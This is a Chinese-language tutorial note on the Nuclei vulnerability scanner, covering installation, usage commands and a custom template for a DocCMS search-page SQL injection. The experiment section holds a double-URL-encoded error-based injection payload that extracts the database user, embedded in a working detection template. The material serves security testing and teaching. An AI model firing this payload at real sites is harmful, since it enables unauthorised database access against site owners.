- [说明](#说明)
- [示例](#示例)
- [实验一](#实验一)

## 说明

> 漏洞扫描，批量检测，自定义POC https://github.com/projectdiscovery/nuclei

下载安装

```
# MacOSX
brew install nuclei
# Go
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

相关链接
- [官方使用文档](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/)
- [README_CN](https://github.com/projectdiscovery/nuclei/blob/master/README_CN.md)

## 示例

```
# 使用模板模板扫描单个 URL
nuclei -u example.com -t template.xml

# 使用模板扫描文件内 url
nuclei -l URL.txt -t xxx.yaml

# 保存扫描结果到 result.txt
nuclei [options] -o result.txt

# 简化输出结果 重试次数5 超时时间10s
nuclei [options] -nm -retries 5 -timeout 10

# 更新引擎
nuclei -update

# 更新模板
nuclei -update-templates

# 扫描指定年份的所有CVE
echo https://example.com | nuclei -t 'cves/2021/*'

# 指定扫描文件夹内所有的 POC
echo https://example.com | nuclei -t 'vulnerabilities/moodle/*'
```

## 实验一

向 `https://example.com/search/index.php` 发送指定 GET 请求，返回响应包内包含 `ORDER BY id DESC` 字段的 URL，GET请求参数如下

```
keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33
```

**实验步骤：**

自定义yaml模板

```yaml
# 必要字段 ID
id: DocCMS-keyword-SQLi
# 必要字段INFO
info:
    name: DocCMS-keyword-SQLi
    author: kylin
    tags: sqli,DocCMS
    reference: http://wiki.peiqi.tech/wiki/cms/DocCMS/DocCMS%20keyword%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
    severity: high
# HTTP请求数据包
requests:
  # 原始数据包(RAW)内容
  - raw:
    - |
      GET /search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33/ HTTP1.1
      Host: {{Hostname}}
    # 匹配字符串包含 ORDER BY id DESC
    matchers:
      - type: word
        words:
          - "ORDER BY id DESC"
```

指定 DocCMS-keyword-SQLi.yaml 模板并且指定 urls.txt 文件扫描

```
nuclei -l urls.txt -t DocCMS-keyword-SQLi.yaml
```

![图 4](../../../@attachment/images/Security/安全工具/nuclei_1661280665338.png)  